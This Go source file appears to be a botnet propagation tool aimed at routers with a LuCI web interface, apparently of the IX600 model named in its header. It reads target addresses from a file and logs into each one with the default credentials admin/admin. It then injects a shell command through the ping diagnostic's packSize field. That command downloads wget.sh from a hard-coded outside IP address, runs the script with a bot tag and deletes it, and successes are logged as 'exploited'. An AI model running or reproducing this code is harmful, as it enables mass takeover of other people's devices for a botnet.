/*

Botswana, IX600

*/


package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

var sem = make(chan struct{}, 100)

func main() {

	ipsFile, err := os.Open("ips.txt")
	if err != nil {
		fmt.Println("Error opening ips.txt:", err)
		return
	}
	defer ipsFile.Close()

	scanner := bufio.NewScanner(ipsFile)
	var wg sync.WaitGroup

	for scanner.Scan() {
		ipPort := strings.TrimSpace(scanner.Text())
		if ipPort != "" {

			wg.Add(1)

			go func(ipPort string) {
				defer wg.Done()

				processRequests(ipPort)
			}(ipPort)
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading ips.txt:", err)
		return
	}

	wg.Wait()
}

func processRequests(ipPort string) {

	sem <- struct{}{}
	defer func() {

		<-sem
	}()

	sysauth, stok := sendLoginRequest(ipPort)

	if sysauth != "" && stok != "" {
		sendPingRequest(ipPort, sysauth, stok)
	}
}

func sendLoginRequest(ipPort string) (string, string) {

	url := fmt.Sprintf("https://%s/cgi-bin/luci", ipPort)

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Timeout: 5 * time.Second, 
	}

	resp, err := client.Post(url, "application/x-www-form-urlencoded", strings.NewReader("username=admin&password=admin"))
	if err != nil {

		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			//fmt.Printf("Timeout for %s\n", ipPort)
			return "", ""
		}
		//fmt.Printf("Error for %s - %v\n", ipPort, err)
		return "", ""
	}
	defer resp.Body.Close()

	if setCookie, ok := resp.Header["Set-Cookie"]; ok {

		sysauth, stok := extractCookieValues(setCookie[0])

		fmt.Printf("\n[B] found %s - [sysauth=%s] - [stok=%s]\n", ipPort, sysauth, stok)

		return sysauth, stok
	}

	return "", ""
}

func sendPingRequest(ipPort, sysauth, stok string) {

	url := fmt.Sprintf("https://%s/cgi-bin/luci/;stok=%s/admin/tools/diagnosis/ping", ipPort, stok)

	sysauthCookie := fmt.Sprintf("sysauth=%s; loginuser=admin", sysauth)

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Timeout: 5 * time.Second, 
	}

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	formFields := map[string]string{
		"destination": "1.1.1.1",
		"packCount":   "4",
		"packSize":    "56`cd /tmp;wget http://144.172.73.12/wget.sh;chmod 777 wget.sh; ./wget.sh alta.bots; rm -rf wget.sh`",
		"isStart":     "Start",
	}

	for field, value := range formFields {
		writer.WriteField(field, value)
	}

	writer.Close()

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		//fmt.Printf("Error creating request for %s - %v\n", ipPort, err)
		return
	}

	req.Header.Set("Host", ipPort)
	req.Header.Set("Cookie", sysauthCookie)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36")
	req.Header.Set("Referer", fmt.Sprintf("https://%s/cgi-bin/luci/;stok=%s/admin/tools/diagnosis/ping/", ipPort, stok))
	req.Header.Set("Connection", "close")

	resp, err := client.Do(req)
	if err != nil {

		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			//fmt.Printf("Timeout for %s\n", ipPort)
			return
		}
		//fmt.Printf("Error for %s - %v\n", ipPort, err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		fmt.Printf("[TA] exploited: %s\n", ipPort)
	}
}

func extractCookieValues(input string) (string, string) {
	sysauthRe := regexp.MustCompile("sysauth=([^;]+);")
	stokRe := regexp.MustCompile(";stok=([^;]+)")

	sysauthMatch := sysauthRe.FindStringSubmatch(input)
	stokMatch := stokRe.FindStringSubmatch(input)

	var sysauth, stok string
	if len(sysauthMatch) > 1 {
		sysauth = sysauthMatch[1]
	}
	if len(stokMatch) > 1 {
		stok = stokMatch[1]
	}

	return sysauth, stok
}
